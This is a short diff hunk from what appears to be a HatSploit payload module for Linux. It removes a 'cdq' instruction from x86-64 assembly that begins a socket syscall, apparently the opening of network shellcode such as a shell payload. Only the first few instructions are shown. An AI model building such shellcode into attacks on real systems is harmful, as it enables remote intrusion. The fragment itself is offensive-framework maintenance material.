@@ -57,7 +57,6 @@ class HatSploitPayload(Payload, Handler, Linux):
             start:
                 push 0x29
                 pop rax
-                cdq
                 push 0x2
                 pop rdi
                 push 0x1
